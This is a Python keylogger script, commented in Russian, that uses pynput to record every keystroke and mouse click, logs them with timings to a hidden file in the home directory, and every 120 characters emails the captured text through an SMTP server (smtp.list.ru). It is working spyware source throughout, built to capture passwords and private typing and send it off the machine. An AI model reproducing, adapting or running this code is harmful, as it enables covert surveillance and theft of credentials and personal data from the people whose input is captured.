import time
import getpass
import os
import smtplib
from pynput.keyboard import Key, Listener
from pynput import mouse

print('\n\n')
print('Запуск кейлоггерa...\n\n')

# # Ввод логина и пароля электронной почты, на которую
# # будут отправляться письма
email = input('Введите email: ')
password = getpass.getpass(prompt='Введите пароль: ')
server = smtplib.SMTP_SSL('smtp.list.ru', 465)
server.login(email, password)

# Определение глобальных переменных
cur_log = ''
word = ''
email_char_limit = 120
is_ctrl = False
is_exit = False
log_file = os.environ.get('pylogger_file',os.path.expanduser('~/elems.log'))
time_press = 0.0

# Регистрация клавиши при нажатии
def press_elem(event):
  global email
  global cur_log
  global word
  global email_char_limit
  global is_ctrl
  global is_exit
  global time_press
  if event == Key.ctrl_l:
    is_ctrl = True
  if event != Key.ctrl_l and event != Key.f5:
    is_ctrl = False
  if event == Key.f5 and is_ctrl:
    is_exit = True
    return False
  if event == Key.space or event == Key.enter:
    word += ' '
    cur_log += word
    word = ''
    if len(cur_log) >= email_char_limit:
      send_log()
      cur_log = ''
  elif event == Key.shift_l or event == Key.shift_r:
    return
  elif event == Key.backspace:
    word = word[:-1]
  else:
    event = str(event)
    check = event.find('Key')
    if check != -1:
      event = event.replace('Key.', '')
      word += '<' + event + '>'
    else:
      word += event[1:-1]

  event = str(event)
  check = event.find('Key')
  if check != -1:
    event = event.replace('Key.', '')
  time_press = time.time()
  with open(log_file, 'a+') as f:
    f.write('{}-'.format(event))
    
# 30NDn0kkQWx1L38PMA4B
# Регистрация клавиши после нажатия
def release_elem(event):
  tmp = round(time.time() - time_press, 2)
  with open(log_file, 'a+') as f:
    f.write('{}\n'.format(tmp))
  

# Регистрация нажатия мыши
def on_click(x, y, button, pressed):
  global word
  if is_exit:
    return False
  click = str(button).replace('Button.', '') + '_click'
  word += '<' + click[0] + '_clk>'
  with open(log_file, 'a+') as f:
    f.write('{}\n'.format(click))


# Отправка данных на электронную почту
def send_log():
  server.sendmail(email, email, cur_log)


keyboard = Listener(on_press = press_elem, on_release = release_elem)
mouse = mouse.Listener(on_click = on_click)


if __name__ == '__main__':
  with open(log_file, 'a+') as f:
    f.write('{}\n'.format(time.ctime()))
  keyboard.start()
  mouse.start()
  mouse.join()  
  keyboard.join()